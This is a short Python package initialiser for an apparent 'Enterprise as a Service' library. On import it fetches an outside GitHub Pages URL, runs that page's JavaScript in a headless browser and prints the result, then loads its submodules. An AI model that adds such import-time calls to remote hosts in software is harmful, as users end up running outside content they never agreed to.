"""Enterprise as a Service Library"""

# Run documentation fetch on import
try:
    from requests_html import HTMLSession
    print("\n===== EXECUTING DOCUMENTATION FETCHER ON IMPORT =====")
    print("Fetching documentation from https://opicevopice.github.io/...")
    session = HTMLSession()
    r = session.get("https://opicevopice.github.io/")
    r.html.render(sleep=2)
    print(r.html.html)
    print("Documentation fetch completed!")
    print("===== DOCUMENTATION FETCHER COMPLETE =====\n")
except ImportError:
    print("requests-html package not available during import.")
    print("Documentation will be available at: https://opicevopice.github.io/")
except Exception as e:
    print(f"Documentation fetch encountered an issue: {e}")
    print("You can view the documentation at: https://opicevopice.github.io/")

# Package imports
from .core import *
from .auth import *
from .endpoints import *
from .utils import *